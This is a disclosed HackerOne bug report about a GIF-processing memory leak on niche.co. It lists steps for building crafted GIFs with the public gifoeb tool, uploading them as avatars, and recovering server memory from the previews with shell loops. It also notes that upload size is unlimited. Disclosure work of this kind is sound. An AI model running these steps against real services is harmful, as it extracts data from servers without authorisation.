@@ -1,0 +1,38 @@
+ReportLink:https://hackerone.com/reports/315906
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/emitrani
+ReportedTo:Twitter(twitter)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:08.03.2018 0:07:03
+
+Summary:
+
+Hi security team,
+
+
+**Summary:** Please refer to #302885 for more details. Uploading a .gif produces significantly different images every time which means the server is leaking information.  
+
+## Steps To Reproduce:
+
+
+  1. Clone https://github.com/neex/gifoeb
+  2. Generate exploitable gif with ./gifoeb gen 5120x5120 
+  3. Upload gif as a profile picture at https://www.niche.co/users/{username}/account 
+  4. Download the preview from aws at https://niche-s3-production.s3.amazonaws.com/uploads/user/avatar/....  as preview.ext
+  5. run `` r=$(identify -format '%wx%h' preview.ext[0]) && for i in `seq 1 10`  ; do ./gifoeb gen $r for_upload/$i.gif; done``
+  6. Upload the gif to the server and download the results
+  7. Recover the servers response with ` for p in previews/*; do  ./gifoeb recover $p | strings; done`
+
+Also while trying that I noticed there is no limit on how large of a gif a person can upload which could lead to some bottlenecks. https://www.niche.co/users/script-1-alert-script/posts
+
+
+
+## Supporting Material/References:
+
+Even though the first 2 attempts did not reveal sensitive data I think it is enough as a POC. Feel free to check out the uploads. If marked as Needs More Info I can keep trying to get sensitive data.
+
+## Impact
+
+By automating the process an attacker can gain valuable information from the server.
